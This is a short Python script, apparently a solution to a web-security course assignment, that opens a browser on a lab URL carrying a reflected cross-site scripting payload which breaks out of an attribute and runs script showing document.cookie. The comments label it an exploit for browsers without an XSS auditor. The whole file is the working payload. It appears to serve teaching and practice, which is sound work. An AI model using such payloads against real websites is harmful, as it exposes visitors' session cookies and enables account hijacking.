import webbrowser

# Exploit:
# secret = "><script>alert(document.cookie)</script>
# Reflected XSS (without XSS-auditor)

def main():
    webbrowser.open('http://www.wsb.com/Assignment2/case29.php?secret2=&secret="><script>alert(document.cookie)<%2Fscript>', 2)

if __name__ == "__main__":
    main()
